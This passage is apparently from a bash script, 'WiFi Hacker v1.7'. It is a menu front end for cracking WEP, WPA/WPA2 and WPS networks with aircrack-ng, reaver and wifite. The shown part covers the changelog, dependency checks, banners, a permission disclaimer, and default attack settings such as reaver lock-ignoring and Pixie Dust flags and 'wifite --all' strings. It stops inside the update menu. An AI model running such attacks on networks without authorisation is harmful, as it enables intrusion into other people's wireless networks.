#!/bin/bash


############################################################################
#   CREDITS BEGIN   ########################################################
############################################################################


# WiFi Hacker v1.7
# esc0rtd3w 2016

# https://github.com/esc0rtd3w/wifi-hacker/

# Uses parts of the aircrack-ng suite, reaver, wifite, and many other tools


############################################################################
#   CREDITS END   ##########################################################
############################################################################





############################################################################
#   VERSION HISTORY BEGIN   ################################################
############################################################################

# v1.7
# - Updated airodump-ng windows to only scan for the encryption type that is currently being targeted.

# v1.6
# - Added a "forceDisconnectWiFi" function to help fix active internet connection issues.
# - Changed the handling of "WiFi Force Disconnect". Now, after accepting the agreement, the main menu will only load if the connection status is "0". If the status is "1", meaning the WiFi is connected to an access point, the "forceDisconnectWiFi" and "checkNetworkStatus" functions are called until the connection is released. This allows for better control of correcting errors resulting in having an active network connection.
# - Added "ifconfig" and "iwconfig" output to Extras Interface Menu
# - Merged "checkForEmptyBSSID", "checkForEmptyESSID", and "checkForEmptyChannel" into "checkForEmptyCredentials" function.
# - Removed "arAttackDeAuthOnRetry" function. This was a duplicate and now uses "arAttackDeAuth" function instead.
# - Cleaned up "stopMonitorMode" function.
# - Added support for bully, used for WPS attacks.
# - Fixed issue with active network connection not force disconnecting before attacks begin.
# - Updated text for several menus.
# - Fixed (mostly) the issue with backup ZIP files overwriting old backups.

# v1.5
# - Updated code to handle new cleaning invoked backup options for "backupSessionFiles" function.
# - Added progress text for "cleanCaptureFiles", "cleanSessionFiles", and backupSessionFiles" functions.
# - Fixed "Clean Session Files" and Clean Capture Files" options from Extras Menu.
# - Now saving session files after Wifite Auto Attacks to prevent the .cap, .xor, etc files from being deleted.
# - Updated minimal number of IVs to 5000 before cracking for Wifite WEP Auto Attacks.
# - Fixed Wifite auto arguments for all encryption types.
# - Updated Misc Menu Text
# - Added "aireplay-ng" and "packetforge-ng" to dependency check.
# - Added terminal background colors and updated foreground text color selection.
# - Added a "more" option that can be typed under WEP Attack Menu. This menu has "TCP Dump", "Generate ARP Packet", "Forge ARP Request", and "Replay ARP Request" options.

# v1.4
# - Updated WPS attack to use PixieDust as a default option after 10 second timeout if no selection is made.
# - Added a manual interface name override option to "getWirelessInterfaces" function. Set manually to wlan0, wlan1, wlan2, etc. This will automatically display during normal execution and you may ignore it for defaults.
# - Added a "refresh" flag that is set to hide override text on subsequent calls to "getWirelessInterfaces" function.
# - Added "bannerSlim" function to use a "Title Only" banner for disclaimer and unreleased menus.
# - Updated text for gathering target info on all the different encryption types.
# - Updated sleep messages for WPS attacks.
# - Fixed PixieDust option not setting correctly if nothing is selected at menu choice.
# - Updated text for all banners. Changed the main title text and domain name.
# - Fixed all the killProcess functions to now kill the process until it no longer shows up under process list.
# - Added a force exit for aircrack-ng before cracking attempt. This attempts to fix the corrupt errors when scanning IVS and CAP files.
# - Fixed previous Airodump and Aireplay windows not closing when launching a new dump session for WEP Attack Menu.
# - Added "findCaptureFiles" function to list all available cap, ivs, csv, netxml files for cracking.
# - Added terminal colors to a "setTerminalColors" function.
# - Added "checkUpdate" and "getUpdate" functions to grab the newest shell script directly.
# - Updated text on stats banner. Changed "Interface Name: " to "Interface: " to allow for longer ESSID names without flooding to the next line.

# v1.3
# - Added support for AirCrack Suite v1.2+ using the new wlanXmon format instead of monX.
# - Fixed "wlanXmon" error in Kali Linux 2.x caused by new AirCrack Suite 1.2+. See "fixKaliTwoMonError" function for more info.
# - Added a function to check the Linux version running.
# - Removed Honeypot Mode from the banners. It has been relocated to the Advanced Menu.
# - Added "$interfaceName" and "$interfaceMode" variables.
# - Added interfaceName to the stats banner. This will display the current interface name (wlan0, mon0, wlan0mon, etc).
# - Added interfaceMode to the main banner. Valid Interface Modes are 0=Managed / 1=Monitor Standard / 2=Monitor New / 3=Monitor Other / 4=Unknown
# - Added "Open Interface Options" item to Extras Menu.
# - Added "Interface Up", "Interface Down", "Interface Managed", and "Interface Monitor" to Extras Menu. The Up and Down functions affect the interface ONLY for monitor mode (mon0, mon1, wlan0mon, wlan1mon, etc) currently. Please use Enable/Disable Channel Hopping to bring up/down a managed interface (i.e. wlan0, wlan1, etc).
# - Added support for all new Reaver arguments and options for Kali 2.x build.
# - Added airodump-ng WPS scanning options to now show WPS connections without using wifite to show them.
# - Removed the wifite window from being launched with standard WPS attack. Replaced by --wps flag in airodump-ng.
# - Added "fixAirmonCompat" function to send the command to kill any processes that may interfere.
# - Removed the "initAirmon" function that was inactive.
# - Added the airmon-ng conflicting process fix to Extras Menu.
# - Added "wlanXmon" interfaces for monitor mode termination. A better way of doing this will be done soon!
# - Fixed not returning to Extras Menu from "Open Interfaces Menu".
# - Added "isDebugMode" variable to show/hide certain areas that may need additional testing output. Disabled by default.
# - Fixed default WEP dump scanning channel hopping during attack.

# v1.2
# - Fixed the top text of disclaimer banner from being cut off.

# v1.1
# - Now globally enforcing disconnection from any active network upon agreement of disclaimer to resolve "Channel Hopping" issues. This must be done for all attacks to work properly.
# - Added "HoneyPot Mode" to main toolbar. The hotkey is "Z" to launch from anywhere in script. There is currently support for airbase-ng and wifi-honey.
# - Fixed "Negative One Channel Error" occuring in airodump-ng on Kali Linux 1.0.6 and higher. This is fixed globally and should work on all platforms.
# - Added "Start NetworkManager", "Stop NetworkManager", "Stop wpa_supplicant", "Stop wpa_cli", "Enable Channel Hopping", and "Disable Channel Hopping" to Extras menu.
# - Enabled the Advanced Menu. Also enabled the hotkey "A" to launch it. Future releases will contain highly configurable settings for supported apps and modules.
# - Added support for nmap and netcat, for use during post exploitation.
# - Fixed some $bssid and $essid variable errors in WEP attacks. 
# - Fixed airodump window not closing if using load session hotkey during victim info, and then returning to the post monitor mode menu.
# - Fixed a bug where the post monitor mode screen would still load if no encryption type was selected. If the encryption type is empty, it will now return to the main menu.
# - Updated on-screen instructions for using the airdump windows and other terminal windows that are opened during target/victim setup.
# - Fixed network connection not refreshing the correct status when returning to the main menu if the network status has changed while still on the menu.
# - Added a second check to verify that no active network connection is present before launching an attack.
# - Moved autoMode text towards the top of the post monitor mode initiation screen to be more easily visible to the user.
# - Added support for post-exploitation attacks after a target has been compromised.
# - Added support for "wifite". This is used for some of the newer automated attack modes as well as an alternate option to aircrack-suite if desired.
# - Added Auto Attack Mode to the main menu. This option uses wifite to scan and attack any vulnerable network.
# - Changed some text around on some items to be more clear and understandable.
# - Added Auto modes for each attack type when selected. Once an encryption type is selected, you can type "autowep, autowps, autowpa, and autowpa2 respectively to automate the attack.
# - Fixed a few $lastMenuID variables not properly set for menu navigation.
# - Added a wifite window alongside the aircrack window when selecting WPS attacks, to help decipher which targets support WPS more easily.

# v1.0
# - Activated the disclaimer when launching the script to make sure everyone knows the rules ;)
# - Added "checkRootStatus" to verify elevated privileges before launching main menu.
# - Fixed a few typos throughout the script.
# - Added Connection display to main menu. A status of "0" is disconnected and "1" is connected.
# - Added connection status check before allowing an attack mode to be selected. This prevents trying to start an attack and being locked into a channel and other abnormalities.
# - Added text display variables for connection status. They can be displayed as "None" or "Wifi", depending on if connection status is 0 or 1.

# v0.9
# - Removed the writeDCrackPy() function. This was used to write the Python script dcrack.py out to a file.

# v0.8
# - Added support for besside-ng. Used for cracking WPA/WPA2 passwords,and upload to cloud cracking,
# - Fixed the aircrack window from closing after running dictionary attack.
# - Added checkDependencies() function to check for all required files before loading main menu.
# - Fixed the Navigation Bar from not showing up on the Help menu.
# - Fixed the aircrack window from not closing when restarting WPA/WPA2 attacks.
# - Fixed Help and Advanced menus not returning to the last page when trying to go back.

# v0.7
# - Fixed WEP aircrack errors with ESSID names that have spaces in them.
# - Fixed Terminal Options not returning to previous menu properly.
# - Cleaned up some old code that is no longer being used or referenced.
# - Fixed reaver WPC files not getting copied correctly.
# - Now copies all WPC files during reaver startup, and overwrites current WPC file after reaver session ends.

# v0.6
# - Added time and date stamp to all $encryptionType.sessions log files.
# - The "Clean Capture Files" option now only removes files in the init directory, not sessions directory.
# - Fixed bug not returning back to Extras menu after selected task has been completed.
# - All created files will now be saved to the "/sessions/$encryptionType" directory by default.
# - Added getCurrentDate() and getCurrentTime() functions to use with sessions and backups.
# - Added Backup options to Extras menu. This creates a zip file with all saved sessions and capture files.
# - Added "*.kismit.csv" and "*.kismit.netxml" files to "Cleanup Capture Files" menu under Extras.
# - Changed all references from $currentTask to $lastMenuID because of menu navigation issues.
# - Added a new variable called $lastMenuID for (hopefully) proper navigation between menus.
# - Moved code for checking MAC Spoof Status into a checkSpoofStatus() function. Can now be used globally.
# - Fixed a typo in Load Session function.
# - Updated sessions save folder and organized by encryption type.
# - Added saving reaver session WPC files to default sessions folder.

# v0.5
# - Fixed WEP attack. It wasn't being properly redirected after the last v0.4 update.
# - All attack modes re-tested and seem to be working fine.
# - Added a check for empty encryption type to prevent doing certain tasks if no type has yet been selected.
# - Updated Save and Load session menu. It does not work properly from some menus. Still in testing.

# v0.4
# - Moved all initialization functions and variables to initMain(). This is only for "code cleanliness".
# - Updated aircrack and airodump redirection based on the encryption type of the attack.
# - Added "Clean Session Files" to Extras menu. Be careful with this and be sure to keep backups.
# - Fixed not being able to return to attacks menu from Save and Load session for WEP attacks.
# - Added a $currentTask variable to change dynamically depending on what function is being executed.
# - Moved aircrack windows for WPA and WPA2 attacks to external terminal windows.
# - Fixed not being able to leave aircrack window while running WPA and WPA2 attacks.

# v0.3
# - Updated WPA and WPA2 attack modes. Both are fully working and can load custom wordlists.
# - Added the ability to change terminals under Extras menu. Supports Gnome, Konsole, Xterm, and Custom.
# - Fixed blank session files being written when no encryption type has yet been selected.
# - Added a disclaimer that must be accepted before launching main menu (currently disabled).
# - Fixed both WPA and WPA2 from not writing proper values to "$capturePath/$encryptionType/$encryptionType.sessions" log file.
# - Fixed a bug in WPA/WPA2 that prevented returning to main menu or exiting from wordlist page.
# - Updated some on-screen text when deauth station is running for WEP, WPA, and WPA2.
# - Removed Auto mode from top banner, its now defaulted after choosing encryption type.

# v0.2
# - Fixed WEP and WPS (reaver) attacks. Both are fully working now!
# - Each attack type writes to its own log file now ("$capturePath/$encryptionType/$encryptionType.sessions").
# - Cleaned up some old migrated code from previous scripts.

# v0.1
# - Initial version. Combined other current wifi scripts into one.


############################################################################
#   VERSION HISTORY END   ##################################################
############################################################################





############################################################################
#   TO DO LIST BEGIN   #####################################################
############################################################################


# Extend the width of the airodump windows when opening externally
# Add change options on-the-fly for WPS and other attack modes
# Add cowpatty support for WPA/WPA2 attacks
# Set an "ok so far" temp variable to see if all dependencies are available
# Set default $serverWPA veriable to some value other than blank
# Add sniffing/wireshark support
# Add support for packetforge-ng
# Add support for airbase-ng
# Create separate handshake file with an appropriate filename
# Add "create wordlist" for phone numbers and possibly others. Add option for local
# Add checks and copy files created by besside to appropriate directories
# Add convert to .hccap support for ocl-hashcat and other compatible software
# Get advanced mode working
# Get help menu working


# Post-Exploitation Attacks To Add (Probably Scrap 20160514)

# driftnet
# nmap
# wifi-honey


############################################################################
#   TO DO LIST END   #######################################################
############################################################################





############################################################################
#   INITIALIZATION OPTIONS BEGIN   #########################################
############################################################################


initMain(){

	#checkArgs

	checkLinuxVersion

	killAll
	#startNetworkManager

	getCurrentDate
	getCurrentTime
	getCurrentDateAndTime

	setDependencies
	checkDependencies

	resizeWindow
	setVariables
	setVariablesRequired
	setVariablesOptional
	setVariablesAdvanced

	setDefaults

	setDefaultsWEP
	setDefaultsWPA
	setDefaultsWPA2
	setDefaultsWPS

	setDefaultSession

	setTerminalColors

	# Optionally show dependencies before launch
	#showDependencies

	# Optionally Show Disclaimer Before Launch
	showDisclaimer

	# Optionally Show Unreleased Text Before Launch
	#isUnreleased

	# Load Main Menu
	menuMain

}

checkArgs(){

	case "$#" in
	
	"1")
	if [ -e $1 ];
		then
			echo "File $1 Exists"
		else
			echo "File $1 Does Not Exist"
	fi
	;;
	
	esac
}

checkLinuxVersion(){

	# Set both default Kali values to ON and if blank, Kali is not present
	isKali=1
	isKaliTwo=1

	# Get Linux Build Info
	linuxVersion=$(lsb_release -a | grep Description | cut -f2 -d":")

	# Check against the Linux Version for the presence of Kali
	kali=$(echo "$linuxVersion" | grep Kali)

	# Check against the Linux Version for the presence of Kali 2.x
	kaliTwo=$(echo "$linuxVersion" | grep Kali | grep 2.)

	# Check For Kali Linux
	case "$kali" in

		"")
		isKali=0
		;;
	esac

	# Check For Kali Linux 2.x
	# Uses Aircrack-ng v1.2 RC2+ (Monitor Mode Is Different)
	case "$kaliTwo" in

		"")
		isKaliTwo=0
		;;
	esac

	#echo "Linux Version: $linuxVersion"
	#echo ""
	#echo "Is Kali?: $isKali"
	#echo ""
	#echo "Is Kali 2.x?: $isKaliTwo"
	#read pause
}


############################################################################
#   INITIALIZATION OPTIONS END   ###########################################
############################################################################





############################################################################
#   DEPENDENCY OPTIONS BEGIN   #############################################
############################################################################


setDependencies(){

	pathAircrack="/usr/bin/aircrack-ng"
	pathAireplay="/usr/sbin/aireplay-ng"
	pathAirodump="/usr/sbin/airodump-ng"
	pathBesside="/usr/sbin/besside-ng"
	pathCut="/usr/bin/cut"
	pathDate="/bin/date"
	pathGrep="/bin/grep"
	pathHead="/usr/bin/head"
	pathLink="/usr/bin/link"
	pathMacchanger="/usr/bin/macchanger"
	pathMkdir="/bin/mkdir"
	pathPacketforge="/usr/sbin/packetforge-ng"
	pathReaver="/usr/bin/reaver"
	pathRmdir="/bin/rmdir"
	pathSed="/bin/sed"
	pathSleep="/bin/sleep"
	pathTail="/usr/bin/tail"
	pathWget="/usr/bin/wget"

}


checkDependencies(){

	#tempCounter=0
	#numberOfDependencies=0
	
	#tempPath=""
	#tempStatus=""

	# If counter is less than max dependencies, then build statuses
	#if [ $tempCounter -lt $numberOfDependencies ];
	#	then
	#		# Set Path Name
	#		if [ -f $tempPath ];
	#			then
	#				# Set Status As Available
	#				$tempStatus="OK"
	#			else
	#				# Set Status As Unavailable
	#				$tempStatus="NA"
	#		fi
	#	else
	#		#echo "Done With Dependencies"
	#		#read pause
	#fi
	
	if [ -f $pathAircrack ];
		then
		   statusPathAircrack="OK"
		else
		   statusPathAircrack="NA"
	fi

	if [ -f $pathAirodump ];
		then
		   statusPathAirodump="OK"
		else
		   statusPathAirodump="NA"
	fi

	if [ -f $pathAireplay ];
		then
		   statusPathAireplay="OK"
		else
		   statusPathAireplay="NA"
	fi

	if [ -f $pathBesside ];
		then
		   statusPathBesside="OK"
		else
		   statusPathBesside="NA"
	fi

	if [ -f $pathCut ];
		then
		   statusPathCut="OK"
		else
		   statusPathCut="NA"
	fi

	if [ -f $pathDate ];
		then
		   statusPathDate="OK"
		else
		   statusPathDate="NA"
	fi

	if [ -f $pathGrep ];
		then
		   statusPathGrep="OK"
		else
		   statusPathGrep="NA"
	fi

	if [ -f $pathHead ];
		then
		   statusPathHead="OK"
		else
		   statusPathHead="NA"
	fi

	if [ -f $pathLink ];
		then
		   statusPathLink="OK"
		else
		   statusPathLink="NA"
	fi

	if [ -f $pathMacchanger ];
		then
		   statusPathMacchanger="OK"
		else
		   statusPathMacchanger="NA"
	fi

	if [ -f $pathMkdir ];
		then
		   statusPathMkdir="OK"
		else
		   statusPathMkdir="NA"
	fi

	if [ -f $pathPacketforge ];
		then
		   statusPathPacketforge="OK"
		else
		   statusPathPacketforge="NA"
	fi

	if [ -f $pathReaver ];
		then
		   statusPathReaver="OK"
		else
		   statusPathReaver="NA"
	fi

	if [ -f $pathRmdir ];
		then
		   statusPathRmdir="OK"
		else
		   statusPathRmdir="NA"
	fi

	if [ -f $pathSed ];
		then
		   statusPathSed="OK"
		else
		   statusPathSed="NA"
	fi

	if [ -f $pathSleep ];
		then
		   statusPathSleep="OK"
		else
		   statusPathSleep="NA"
	fi

	if [ -f $pathTail ];
		then
		   statusPathTail="OK"
		else
		   statusPathTail="NA"
	fi

	if [ -f $pathWget ];
		then
		   statusPathWget="OK"
		else
		   statusPathWget="NA"
	fi

}


downloadDependencies(){

	blank=""

}


showDependencies(){

	banner
	bannerStats

	echo ""
	echo "List of File Dependencies Needed"
	echo ""
	echo "$pathAircrack - Status: $statusPathAircrack"
	echo "$pathAireplay - Status: $statusPathAireplay"
	echo "$pathAirodump - Status: $statusPathAirodump"
	echo "$pathBesside - Status: $statusPathBesside"
	echo "$pathCut - Status: $statusPathCut"
	echo "$pathDate - Status: $statusPathDate"
	echo "$pathGrep - Status: $statusPathGrep"
	echo "$pathHead - Status: $statusPathHead"
	echo "$pathLink - Status: $statusPathLink"
	echo "$pathMacchanger - Status: $statusPathMacchanger"
	echo "$pathMkdir - Status: $statusPathMkdir"
	echo "$pathPacketforge - Status: $statusPathPacketforge"
	echo "$pathReaver - Status: $statusPathReaver"
	echo "$pathRmdir - Status: $statusPathRmdir"
	echo "$pathSed - Status: $statusPathSed"
	echo "$pathSleep - Status: $statusPathSleep"
	echo "$pathTail - Status: $statusPathTail"
	echo "$pathWget - Status: $statusPathWget"
	echo ""
	echo ""

	echo "Press ENTER to continue...."

	read pause

}


############################################################################
#   DEPENDENCY OPTIONS END   ###############################################
############################################################################





############################################################################
#   TERMINAL OPTIONS BEGIN   ###############################################
############################################################################


setWindowTitle(){

	currentTask="setWindowTitle"

	title='echo -ne "\033]0;WiFi Hacker v1.7\007"'

	$title

}


resizeWindow(){

	currentTask="resizeWindow"

	printf '\033[8;32;115t'

}


setTerminalColors(){

	currentTask="setTerminalColors"

	# Foreground Colors
	defaultFG=$(echo 'printf' '\033[39m')
	
	black=$(echo 'printf' '\033[30m')
	blue=$(echo 'printf' '\033[34m')
	cyan=$(echo 'printf' '\033[36m')
	darkGrey=$(echo 'printf' '\033[90m')
	green=$(echo 'printf' '\033[32m')
	lightBlue=$(echo 'printf' '\033[94m')
	lightCyan=$(echo 'printf' '\033[96m')
	lightGreen=$(echo 'printf' '\033[92m')
	lightGrey=$(echo 'printf' '\033[37m')
	lightMagenta=$(echo 'printf' '\033[95m')
	lightRed=$(echo 'printf' '\033[91m')
	lightYellow=$(echo 'printf' '\033[93m')
	magenta=$(echo 'printf' '\033[35m')
	red=$(echo 'printf' '\033[31m')
	white=$(echo 'printf' '\033[0m')
	whiteAlt=$(echo 'printf' '\033[97m')
	yellow=$(echo 'printf' '\033[33m')
	
	# Background Colors
	defaultBG=$(echo 'printf' '\033[49m')
	
	blackBG=$(echo 'printf' '\033[40m')
	blueBG=$(echo 'printf' '\033[44m')
	cyanBG=$(echo 'printf' '\033[46m')
	darkGreyBG=$(echo 'printf' '\033[100m')
	greenBG=$(echo 'printf' '\033[42m')
	lightBlueBG=$(echo 'printf' '\033[104m')
	lightCyanBG=$(echo 'printf' '\033[106m')
	lightGreenBG=$(echo 'printf' '\033[102m')
	lightGreyBG=$(echo 'printf' '\033[47m')
	lightMagentaBG=$(echo 'printf' '\033[105m')
	lightRedBG=$(echo 'printf' '\033[101m')
	lightYellowBG=$(echo 'printf' '\033[103m')
	magentaBG=$(echo 'printf' '\033[45m')
	redBG=$(echo 'printf' '\033[41m')
	whiteBG=$(echo 'printf' '\033[107m')
	yellowBG=$(echo 'printf' '\033[43m')

}


setTerminalTextEffects(){

	currentTask="setTerminalTextEffects"

	textBlink=$(echo -e "\e[5m")
	textBold=$(echo -e "\e[1m")
	textDim=$(echo -e "\e[2m")
	textHidden=$(echo -e "\e[8m")
	textInverted=$(echo -e "\e[7m")
	textUnderline=$(echo -e "\e[4m")

}


setVariables(){

	currentTask="setVariables"

	terminal="gnome-terminal -x"
	terminalGnome="gnome-terminal -x"
	terminalKonsole="konsole -e"
	terminalXterm="xterm -e"

	bin=""
	startMonitorMode="airmon-ng start"
	stopMonitorMode="airmon-ng stop"

	getRandomMacAddress=""
	spoofStatus="0"

	encryptionType="empty"
	encryptionTypeText="Empty"

	ipStatus="0"

}


############################################################################
#   TERMINAL OPTIONS END   #################################################
############################################################################





############################################################################
#   DEFAULT VARIABLES BEGIN   ##############################################
############################################################################


setVariablesRequired(){

	currentTask="setVariablesRequired"

	interface="wlan0"
	#interfaceMonitor="mon0"
	interfaceMonitor="wlan0mon"
	interfaceName="wlan0"
	interfaceMode="0"
	bssid=""
	essid=""
	channel=""

	# Update Stuff
	updateMaster=https://raw.githubusercontent.com/esc0rtd3w/wifi-hacker/master/wifi-hacker.sh
	updateTemp="/tmp/update-check.tmp"



	# This is used to return from backupCaptureFiles if invoked from backupCaptureFiles
	backupFromCaptureErase="0"

	# This is used to return from backupSessionFiles if invoked from backupSessionFiles
	backupFromSessionErase="0"

	
	# Default Attack Methods
	attackMethodWEP=""
	attackMethodWPS="reaver"
	attackMethodWPA=""
	attackMethodWPA2=""

}


setVariablesOptional(){

	currentTask="setVariablesOptional"

	blank=""

}


setVariablesAdvanced(){

	currentTask="setVariablesAdvanced"

	blank=""

}


setDefaults(){

	currentTask="setDefaults"

	versionBase="1.7"
	versionRemote="0.0"

	initPath="$PWD"

	isDebugMode="0"
	
	# Default Capture Lists Values
	listCap=0
	listIvs=0
	listXor=0
	listCsv=0
	listNetXml=0

}


setDefaultsWEP(){

	currentTask="setDefaultsWEP"

	# aircrack-ng cracking mode WEP
	acMode="1"

	# aircrack-ng cracking mode WEP (WPA-PSK)
	#acMode="2"

}


setDefaultsWPA(){

	currentTask="setDefaultsWPA"

	wordlist="/usr/share/wordlists/metasploit/password.lst"

	retryDeauth="0"

	serverWPA=""

}


setDefaultsWPA2(){

	currentTask="setDefaultsWPA2"

}


setDefaultsWPS(){

	currentTask="setDefaultsWPS"

	reaver="reaver"

	reaverSessionPath="etc/reaver"
	bssidCharOnly=""

	reaverInterfaceInput=""
	reaverBSSIDInput=""

	reaverChannelInput=""
	reaverESSIDInput=""
	reaverExecInput=""
	reaverMACInput=""
	reaverOutfileInput=""
	reaverSessionInput=""

	reaverDelayInput=""
	reaverFailWaitInput=""
	reaverM57TimeoutInput=""
	reaverMaxAttemptsInput=""
	reaverPinInput=""
	reaverTimeoutInput=""

	reaverDelay="--delay="
	reaverDHSmall="--dh-small"
	reaverEAPTerminate="--eap-terminate"
	reaverFailWait="--fail-wait="
	reaverIgnoreLocks="--ignore-locks"
	reaverM57Timeout="--m57-timeout="
	reaverMaxAttempts="--max-attempts="
	reaverNack="--nack"
	reaverNoAssociate="--no-associate"
	reaverNoNacks="--no-nacks"
	reaverPin="--pin="
	reaverRecurringDelay="--recurring-delay"
	reaverTimeout="--timeout="
	reaverWin7False="--win7"

	reaver5ghz="--5ghz"
	reaverAuto="--auto"
	reaverChannel="--channel="
	reaverDaemonize="--daemonize"
	reaverESSID="--essid="
	reaverExec="--exec="
	reaverFixed="--fixed"
	reaverHelp="--help"
	reaverMAC="--mac="
	reaverOutfile="--out-file="
	reaverQuiet="--quiet"
	reaverSession="--session="
	reaverVerbose="-v"
	reaverVerboseMore="-vv"

	# Updated Options
	reaverDaemonize="-D"
	reaverExhaustive="-X"
	reaverNoAutoPass="-Z"
	reaverP1Index="-1"
	reaverP2Index="-2"
	reaverPixie="-K"
	reaverPixieLoop="-P"
	reaverGeneratePin="-W"

	# -K Argument Number (Default 1)
	pixieNumber="1"


	wifite="wifite"
	wifiteAttackAll="wifite --all"
	wifiteAttackWEP="wifite --all --wep"
	wifiteAttackWPA="wifite --all --wpa"
	wifiteAttackWPA2="wifite --all --wpa"
	wifiteAttackWPS="wifite --all --wps"

	# Bully Options
	#bully <options> interface
	
}


setDefaultSession(){

	currentTask="setDefaultSession"

	sessionID="0"

	capturePath=$(echo "$PWD/sessions")
	capturePathWEP=$(echo "$PWD/sessions/wep")
	capturePathWPS=$(echo "$PWD/sessions/wps")
	capturePathWPA=$(echo "$PWD/sessions/wpa")
	capturePathWPA2=$(echo "$PWD/sessions/wpa2")

}


setVariablesPostExploitation(){

	blank=""

}


############################################################################
#   DEFAULT VARIABLES END   ################################################
############################################################################





############################################################################
#   DISCLAIMER BEGIN   #####################################################
############################################################################


showDisclaimer(){

	currentTask="showDisclaimer"
	lastMenuID="showDisclaimer"

	sessionCreatePaths
	sessionRemoveEmpty

	bannerSlim

	$cyan
	echo ""
	echo "****************************************************************************************************"
	echo "THIS WILL TERMINATE ANY ACTIVE INTERNET CONNECTION! IF YOU HAVE ISSUES CONNECTING TO THE INTERNET"
	echo "AFTER AN ATTACK HAS BEEN PERFORMED, USE THE EXTRAS OPTION IN TOOLBAR TO START AND STOP SERVICES."
	echo "IF THIS DOES NOT WORK, THEN YOU CAN RESTART THIS SCRIPT, OR REBOOT THE MACHINE AND RETURN TO NORMAL."
	echo "****************************************************************************************************"
	echo ""
	$red
	echo "**********************************************************"
	echo "YOU MUST AGREE TO THESE TERMS BEFORE USING THIS SOFTWARE!"
	echo "**********************************************************"
	$white
	echo ""
	echo "By using this script, you are agreeing to the following terms:"
	echo ""
	echo "1) Not to be used for attacking access points that you do not have permission to test"
	echo ""
	echo "2) Stay within legal limits of transmission power, depending on your country laws"
	echo ""
	echo "3) Stay within legal limits of channel usage, depending on your country laws"
	echo ""
	$red
	echo "**********************************************************"
	echo "YOU MUST AGREE TO THESE TERMS BEFORE USING THIS SOFTWARE!"
	echo "**********************************************************"
	$white
	echo ""
	echo ""
	echo ""
	echo "PLEASE PRESS "\""Y"\"" AND ENTER TO ACCEPT AND CONTINUE"
	echo ""

	read agreeToDisclaimer

	case "$agreeToDisclaimer" in

		"")
		bannerExit
		;;

		"Y" | "y")
		fixNegativeOneChannelError
		#initAirmon
		fixAirmonCompat
		#startNetworkManager
		#killNetworkManager
		#killWpaSupplicant
		#initMonitorMode
		#stopMonitorMode
		menuMain
		;;

		*)
		bannerExit
		;;

	esac

}


############################################################################
#   DISCLAIMER END   #######################################################
############################################################################





############################################################################
#   BANNERS BEGIN   ########################################################
############################################################################


banner(){

	setWindowTitle

	currentTask="banner"

	clear
	$blue
	echo "---------------------    ****************************************************************    ----------------------"
	echo "|  [M] Main Menu    |    * WiFi Hacker v$versionBase  /  esc0rtd3w 2016  /  github.com/esc0rtd3w *    | [X] Exit           |"
	echo "---------------------    ****************************************************************    ----------------------"
	$yellow
	echo "-------------------------------------------------------------------------------------------------------------------"
	echo "| Connection: $ipStatus  |  Interface Mode: $interfaceMode  |  [A] Advanced  |  Sessions: [S] Save  [L] Load  |  [E] Extras  [H] Help  |"
	echo "-------------------------------------------------------------------------------------------------------------------"
	#echo ""
	$white

}


bannerNoMenu(){

	currentTask="bannerNoMenu"

	setWindowTitle

	clear
	$blue
	echo "---------------------    ****************************************************************    ----------------------"
	echo "|  [ CTRL+C ] Main  |    * WiFi Hacker v$versionBase  /  esc0rtd3w 2016  /  github.com/esc0rtd3w *    | [CTRL+C x2 ] Exit  |"
	echo "---------------------    ****************************************************************    ----------------------"
	$yellow
	echo "-------------------------------------------------------------------------------------------------------------------"
	echo "| Connection: $ipStatus  |  Interface Mode: $interfaceMode  |  [A] Advanced  |  Sessions: [S] Save  [L] Load  |  [E] Extras  [H] Help  |"
	echo "-------------------------------------------------------------------------------------------------------------------"
	#echo ""
	$white

}


bannerMain(){

	currentTask="bannerMain"

	setWindowTitle

	clear
	$blue
	echo "---------------------    ****************************************************************    ----------------------"
	echo "|  [ ]              |    * WiFi Hacker v$versionBase  /  esc0rtd3w 2016  /  github.com/esc0rtd3w *    | [CTRL+C    ] Exit  |"
	echo "---------------------    ****************************************************************    ----------------------"
	echo "-------------------------------------------------------------------------------------------------------------------"
	$yellow
	echo "| Connection: $ipStatus  |  Interface Mode: $interfaceMode  |  [A] Advanced  |  Sessions: [S] Save  [L] Load  |  [E] Extras  [H] Help  |"
	echo "-------------------------------------------------------------------------------------------------------------------"
	#echo ""
	$white

}

bannerMenu(){

	currentTask="bannerMenu"

	setWindowTitle

	clear
	$blue
	echo "---------------------    ****************************************************************    ----------------------"
	echo "|  [ ]              |    * WiFi Hacker v$versionBase  /  esc0rtd3w 2016  /  github.com/esc0rtd3w *    | [CTRL+C    ] Exit  |"
	echo "---------------------    ****************************************************************    ----------------------"
	$yellow
	echo "-------------------------------------------------------------------------------------------------------------------"
	echo "| Connection: $ipStatus  |  Interface Mode: $interfaceMode  |  [A] Advanced  |  Sessions: [S] Save  [L] Load  |  [E] Extras  [H] Help  |"
	echo "-------------------------------------------------------------------------------------------------------------------"
	#echo ""
	$white

}

bannerSlim(){

	currentTask="bannerSlim"

	setWindowTitle

	clear
	$blue
	echo "---------------------    ****************************************************************    ----------------------"
	echo "|  [ ]              |    * WiFi Hacker v$versionBase  /  esc0rtd3w 2016  /  github.com/esc0rtd3w *    | [CTRL+C    ] Exit  |"
	echo "---------------------    ****************************************************************    ----------------------"
	$white

}


bannerStats(){

	currentTask="bannerStats"

	$cyan
	echo "-------------------------------------------------------------------------------------------------------------------"
	echo "Interface: $interfaceName / MAC: $macAddressMonitor / ESSID: $essid / BSSID: $bssid / Channel: $channel"
	echo "-------------------------------------------------------------------------------------------------------------------"
	echo ""
	$white

}

bannerExit(){

	currentTask="bannerExit"

	sessionWriteEndCurrent

	sessionRemoveEmpty

	forceDisconnectWifi

	clear
	$blue
	echo "Thank You For Playing Fair ;)"
	echo ""
	echo "esc0rtd3w 2016"
	echo ""
	echo ""
	$cyan
	echo "View My Other Projects On GitHub:"
	echo ""
	echo "https://github.com/esc0rtd3w"
	echo ""
	echo ""

	exit

}


############################################################################
#   BANNERS END   ##########################################################
############################################################################





############################################################################
#   GLOBAL TEXT BEGIN   ####################################################
############################################################################


doSleepMessage(){

	currentTask="doSleepMessage"

	banner
	bannerStats
	echo "$sleepMessage"

}


############################################################################
#   GLOBAL TEXT END   ######################################################
############################################################################





############################################################################
#   UPDATE STUFF BEGIN   ###################################################
############################################################################


menuUpdate(){

	currentTask="menuUpdate"
	
	banner
	
	echo ""
	echo "Update Menu"
	echo ""
	echo ""
	echo ""
	echo "Current Version: v$versionBase"
	echo ""
	echo "Remote Version: v$versionRemote"
	echo ""
	echo ""
	echo ""
	echo ""
	echo "Choose an option and press ENTER:"
	echo ""
